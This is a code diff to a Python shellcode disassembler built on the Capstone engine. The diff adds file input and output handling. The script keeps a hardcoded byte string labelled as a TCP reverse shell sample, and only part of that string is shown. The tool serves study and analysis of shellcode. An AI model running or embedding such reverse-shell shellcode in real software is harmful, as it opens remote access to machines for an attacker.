@@ -4,7 +4,7 @@ import sys
 #reference: from http://www.capstone-engine.org/lang_python.html
 
 #a tcp reverse shell sample
-shellcode = (
+sample_shellcode = (
 "\x31\xdb\xf7\xe3\x6a\x66\x58\xfe\xc3"
 "\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
 "\x96\x31\xc0\xfe\xc3\x88\xda\xfe\xc3"
@@ -22,12 +22,37 @@ shellcode = (
 def main():
 	if len(sys.argv) < 3:
 		usage()
+		sys.exit(1)
+
+	out_filename = sys.argv[1]
+	shellcode_filename = sys.argv[2]
+
+	shellcode_fd = open(shellcode_filename, "rb")
+
+	shellcode = ""
+
+	#get the raw bytes from the file
+	for line in shellcode_fd.readlines():
+		shellcode += line
+
+	shellcode_fd.close()
+
+	print "[+] Disassembling shellcode and writing to %s [+]\n" %out_filename
+	
+
+	to_outfile(out_filename, disassemble(shellcode))
+
+	print "[+] Done [+]\n"
 
 def usage():
-	print "%s -o <out_file> -s <shellcode_file>" %sys.argv[0]
+	print "%s <out_file> <shellcode_file>" %sys.argv[0]
 
 def to_outfile(file_name, disassembly):
 	fd = open(file_name, "w")
+
+	fd.write(disassembly)
+
+	fd.close()
 
 
 #This function disassembles the given shellcode using
